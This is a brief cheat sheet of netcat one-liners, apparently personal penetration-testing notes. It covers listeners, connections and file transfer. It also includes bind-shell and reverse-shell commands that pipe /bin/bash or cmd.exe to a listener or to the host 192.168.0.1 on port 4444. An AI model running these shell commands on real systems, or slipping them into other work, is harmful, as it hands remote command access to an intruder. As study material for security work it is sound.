listening on 4444 :  nc -lvnp 4444 
connecting to 4444 of other host : nc 192.168.0.1 4444

listening on 4444 with own shell : nc -lvnp 4444 -e /bin/bash or nc -lvnp 4444 -e cmd.exe (bind shell)
connecting on 4444 of other host with own shell : nc 192.168.0.1 4444 -e /bin/bash & nc 192.168.0.1 4444 -e cmd.exe (reverse shell)

listing on 4444 with file to share : nc -lvnp 4444 < myfile.php
connecting on 4444 with file to share : nc 192.168.0.1 4444 > myfile.php


